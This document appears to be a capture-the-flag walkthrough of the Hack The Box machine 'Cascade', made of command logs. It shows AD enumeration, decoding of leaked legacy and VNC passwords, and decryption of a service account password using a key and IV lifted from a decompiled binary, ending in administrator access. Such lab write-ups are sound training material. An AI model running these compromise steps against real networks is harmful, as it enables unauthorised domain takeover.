# Cascade
## ldapsearch
## windapsearch
## samba
## vncpwd
## evil-winrm
## dnspy
``````

➜  echo "10.10.10.182 cascade.htb" | sudo tee -a /etc/hosts

➜  rustscan -a cascade.htb --ulimit 5000

Open 10.10.10.182:53
Open 10.10.10.182:88
Open 10.10.10.182:135
Open 10.10.10.182:139
Open 10.10.10.182:389
Open 10.10.10.182:445
Open 10.10.10.182:3268
Open 10.10.10.182:3269
Open 10.10.10.182:5985
Open 10.10.10.182:49154
Open 10.10.10.182:49157
Open 10.10.10.182:49155
Open 10.10.10.182:49158
Open 10.10.10.182:49170

➜  sudo nmap -Pn -sV -T4 -p- -oA Cascade -vv cascade.htb

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  tcpwrapped    syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

➜  rpcclient -U '' -N cascade.htb

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

➜  sudo ldapsearch -x -H ldap://cascade.htb -s base namingcontexts

dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

➜  sudo ldapsearch -x -H ldap://cascade.htb -b 'dc=cascade,dc=local'

➜  sudo ldapsearch -x -H ldap://cascade.htb -b 'dc=cascade,dc=local' > cascade_dump.txt 

➜  sudo ldapsearch -x -H ldap://cascade.htb -b 'dc=cascade,dc=local' '(objectClass=person)' > cascade_people.txt

➜  bat cascade_people.txt 

 212   │ # Ryan Thompson, Users, UK, cascade.local
 243   │ sAMAccountName: r.thompson
 254   │ cascadeLegacyPwd: clk0bjVldmE=

➜  echo "clk0bjVldmE=" | base64 --decode

rY4n5eva

Alternatively,

➜  cd /opt/windapsearch
➜  windapsearch git:(master) ✗ ./windapsearch.py -U --full --dc-ip cascade.htb > usernames.txt               
➜  windapsearch git:(master) ✗ bat usernames.txt 

 138   │ cn: Ryan Thompson
 163   │ sAMAccountName: r.thompson
 174   │ cascadeLegacyPwd: clk0bjVldmE=

➜  echo "clk0bjVldmE=" | base64 --decode

rY4n5eva

➜  crackmapexec winrm cascade.htb -u r.thompson -p rY4n5eva

SMB         cascade.htb     5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        cascade.htb     5985   CASC-DC1         [*] http://cascade.htb:5985/wsman
WINRM       cascade.htb     5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva "unsupported hash type md4"

➜  crackmapexec smb cascade.htb -u r.thompson -p rY4n5eva

SMB         cascade.htb     445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.htb     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 

➜  crackmapexec smb cascade.htb -u r.thompson -p rY4n5eva --shares

SMB         cascade.htb     445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.htb     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         cascade.htb     445    CASC-DC1         [+] Enumerated shares
SMB         cascade.htb     445    CASC-DC1         Share           Permissions     Remark
SMB         cascade.htb     445    CASC-DC1         -----           -----------     ------
SMB         cascade.htb     445    CASC-DC1         ADMIN$                          Remote Admin
SMB         cascade.htb     445    CASC-DC1         Audit$                          
SMB         cascade.htb     445    CASC-DC1         C$                              Default share
SMB         cascade.htb     445    CASC-DC1         Data            READ            
SMB         cascade.htb     445    CASC-DC1         IPC$                            Remote IPC
SMB         cascade.htb     445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         cascade.htb     445    CASC-DC1         print$          READ            Printer Drivers
SMB         cascade.htb     445    CASC-DC1         SYSVOL          READ            Logon server share 

➜  smbmap -H cascade.htb -u r.thompson -p rY4n5eva -R --depth 10 > cascade_smbmap.txt

        .\Data\IT\Email Archives\*
        dr--r--r--                0 Tue Jan 28 12:00:30 2020    .
        dr--r--r--                0 Tue Jan 28 12:00:30 2020    ..
        fr--r--r--             2522 Tue Jan 28 12:00:30 2020    Meeting_Notes_June_2018.html
        .\Data\IT\Temp\s.smith\*
        dr--r--r--                0 Tue Jan 28 14:00:05 2020    .
        dr--r--r--                0 Tue Jan 28 14:00:05 2020    ..
        fr--r--r--             2680 Tue Jan 28 14:00:01 2020    VNC Install.reg

➜  smbclient //cascade.htb/Data  -U r.thompson%rY4n5eva -c 'get "IT\Email Archives\Meeting_Notes_June_2018.html"'

getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT\Email Archives\Meeting_Notes_June_2018.html (9.7 KiloBytes/sec) (average 9.7 KiloBytes/sec)

➜  smbclient //cascade.htb/Data  -U r.thompson%rY4n5eva -c 'get "IT\Temp\s.smith\VNC Install.reg"'

getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT\Temp\s.smith\VNC Install.reg (15.2 KiloBytes/sec) (average 15.2 KiloBytes/sec)

➜  bat IT\\Email\ Archives\\Meeting_Notes_June_2018.html 

  42   │ <p>-- We will be using a temporary account to
  43   │ perform all tasks related to the network migration and this account will be deleted at the end of
  44   │ 2018 once the migration is complete. This will allow us to identify actions
  45   │ related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

➜  bat IT\\Temp\\s.smith\\VNC\ Install.reg 

  29   │ "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

➜  cd /opt ; sudo git clone https://github.com/jeroennijhof/vncpwd ; chown -R windows_kali:windows_kali vncpwd ; cd vncpwd ; make

gcc -Wall -g -o vncpwd vncpwd.c d3des.c

➜  vncpwd git:(master) ✗ gcc -Wall -g -o vncpwd vncpwd.c d3des.c
➜  vncpwd git:(master) ✗ echo "6bcf2a4b6e5aca0f" | xxd -p -r > decode_me.txt
➜  vncpwd git:(master) ✗ ./vncpwd decode_me.txt

Password: sT333ve2

Alternatively,

Go to:

https://github.com/frizb/PasswordDecrypts

➜  sudo msfconsole
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> require 'rex/proto/rfb'
=> false
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

Uname/pword:

s.smith:sT333ve2

➜  crackmapexec winrm cascade.htb -u s.smith -p sT333ve2

SMB         cascade.htb     5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        cascade.htb     5985   CASC-DC1         [*] http://cascade.htb:5985/wsman
WINRM       cascade.htb     5985   CASC-DC1         [-] cascade.local\s.smith:sT333ve2 "unsupported hash type md4"

➜  evil-winrm -u s.smith -p sT333ve2 -i cascade.htb

*Evil-WinRM* PS C:\Users\s.smith\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue
   
	Directory: C:\Users\s.smith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/7/2022  11:12 AM             34 user.txt

*Evil-WinRM* PS C:\Users\s.smith\Documents> type C:\Users\s.smith\Desktop\user.txt

user_flag


➜  crackmapexec smb cascade.htb -u s.smith -p sT333ve2 --shares   

SMB         cascade.htb     445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         cascade.htb     445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         cascade.htb     445    CASC-DC1         [+] Enumerated shares
SMB         cascade.htb     445    CASC-DC1         Share           Permissions     Remark
SMB         cascade.htb     445    CASC-DC1         -----           -----------     ------
SMB         cascade.htb     445    CASC-DC1         ADMIN$                          Remote Admin
SMB         cascade.htb     445    CASC-DC1         Audit$          READ            
SMB         cascade.htb     445    CASC-DC1         C$                              Default share
SMB         cascade.htb     445    CASC-DC1         Data            READ            
SMB         cascade.htb     445    CASC-DC1         IPC$                            Remote IPC
SMB         cascade.htb     445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         cascade.htb     445    CASC-DC1         print$          READ            Printer Drivers
SMB         cascade.htb     445    CASC-DC1         SYSVOL          READ            Logon server share 

➜  smbmap -H cascade.htb -s Audit$ -u s.smith -p sT333ve2 -R --depth 10 --exclude Data NETLOGON print$ SYSVOL

	.\Audit$\*
	dr--r--r--                0 Wed Jan 29 12:01:26 2020	.
	dr--r--r--                0 Wed Jan 29 12:01:26 2020	..
	fr--r--r--            13312 Tue Jan 28 15:47:08 2020	CascAudit.exe
	fr--r--r--            12288 Wed Jan 29 12:01:26 2020	CascCrypto.dll
	dr--r--r--                0 Tue Jan 28 15:43:18 2020	DB
	fr--r--r--               45 Tue Jan 28 17:29:47 2020	RunAudit.bat
	fr--r--r--           363520 Tue Jan 28 14:42:18 2020	System.Data.SQLite.dll
	fr--r--r--           186880 Tue Jan 28 14:42:18 2020	System.Data.SQLite.EF6.dll
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x64
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x86
	.\Audit$\DB\*
	dr--r--r--                0 Tue Jan 28 15:43:18 2020	.
	dr--r--r--                0 Tue Jan 28 15:43:18 2020	..
	fr--r--r--            24576 Tue Jan 28 15:43:18 2020	Audit.db
	.\Audit$\x64\*
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..
	fr--r--r--          1639936 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll
	.\Audit$\x86\*
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.
	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..
	fr--r--r--          1246720 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll

➜  smbclient //cascade.htb/Audit$  -U s.smith%sT333ve2 -c 'get DB\Audit.db'

getting file \DB\Audit.db of size 24576 as DB\Audit.db (69.6 KiloBytes/sec) (average 69.6 KiloBytes/sec)

➜  sqlite3 DB\\Audit.db 

sqlite> .tables

DeletedUserAudit  Ldap              Misc

sqlite> SELECT * FROM DeletedUserAudit;

6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local

sqlite> SELECT * FROM Ldap;

1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

sqlite> SELECT * FROM Misc;

sqlite> .exit

➜  smbclient //cascade.htb/Audit$  -U s.smith%sT333ve2 -c 'get CascAudit.exe'   

getting file \CascAudit.exe of size 13312 as CascAudit.exe (46.1 KiloBytes/sec) (average 46.1 KiloBytes/sec)

➜  smbclient //cascade.htb/Audit$  -U s.smith%sT333ve2 -c 'get RunAudit.bat' 

getting file \RunAudit.bat of size 45 as RunAudit.bat (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

Go to: DnsSpy
Open:

CascAudit.exe -> CascAudiot -> MainModule @02000008

Content:

sqliteConnection.Open();
using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
{
	using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
	{
		sqliteDataReader.Read();
		str = Conversions.ToString(sqliteDataReader["Uname"]);
		str2 = Conversions.ToString(sqliteDataReader["Domain"]);
		string text = Conversions.ToString(sqliteDataReader["Pwd"]);
		try
		{
			password = Crypto.DecryptString(text, "c4scadek3y654321");
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error decrypting password: " + ex.Message);
			return;
		}
	}
}
sqliteConnection.Close();

➜  smbclient //cascade.htb/Audit$  -U s.smith%sT333ve2 -c 'get CascCrypto.dll'

getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (39.5 KiloBytes/sec) (average 39.5 KiloBytes/sec)

Go to: DnsSpy
Open:

CascCrypto.dll -> CaseCrypto -> Crypto

Content:

byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
Aes aes = Aes.Create();
aes.BlockSize = 128;
aes.KeySize = 128;
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
aes.Key = Encoding.UTF8.GetBytes(Key);
aes.Mode = CipherMode.CBC;
string result;
using (MemoryStream memoryStream = new MemoryStream())
{
	using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
	{
		cryptoStream.Write(bytes, 0, bytes.Length);
		cryptoStream.FlushFinalBlock();
	}
	result = Convert.ToBase64String(memoryStream.ToArray());
}
return result;


key from:

password = Crypto.DecryptString(text, "c4scadek3y654321");

IV from:

aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");

Password from:

1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

Cipher:

aes.Mode = CipherMode.CBC;

Go to:

https://pypi.org/project/pyaes/

Find:

## Project description
A pure-Python implementation of the AES (FIPS-197) block-cipher algorithm and common modes of operation (CBC, CFB, CTR, ECB, OFB) with no dependencies beyond standard Python libraries. See README.md for API reference and details.

➜  vi check.py
Add:

import pyaes
from base64 import b64decode

key = b'c4scadek3y654321'
iv = b'1tdyjCbY1Ix49842'
aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
print(decrypted.decode())

➜  pip3 install pyaes
➜  chmod 700 check.py
➜  python3 check.py

w3lc0meFr31nd

Uname/pword:

ArkSvc:w3lc0meFr31nd

➜  evil-winrm -u ArkSvc -p w3lc0meFr31nd -i cascade.htb

*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc

User name                    arksvc
Full Name                    ArkSvc
Comment
Users comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *

*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property * | select-object * -last 1

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
PropertyNames                   : {accountExpires, badPasswordTime, badPwdCount, CanonicalName...}
PropertyCount                   : 42

➜  echo "YmFDVDNyMWFOMDBkbGVz" | base64 --decode 

baCT3r1aN00dles% 
➜  crackmapexec winrm cascade.htb -u administrator -p baCT3r1aN00dles 

SMB         cascade.htb     5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        cascade.htb     5985   CASC-DC1         [*] http://cascade.htb:5985/wsman
WINRM       cascade.htb     5985   CASC-DC1         [-] cascade.local\administrator:baCT3r1aN00dles "unsupported hash type md4"

➜  evil-winrm -u administrator -p baCT3r1aN00dles -i cascade.htb

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami

cascade\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/7/2022  11:12 AM             34 root.txt

    Directory: C:\Users\s.smith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/7/2022  11:12 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\s.smith\Desktop\user.txt

user_flag

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt

root_flag

``````

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707111004.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707111449.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707113631.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707113609.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707113324.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707071429.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707070911.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707071933.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707072359.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707073434.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707073509.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707074734.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707075221.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707090701.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707095308.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707095344.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220707100043.png)

#hacking
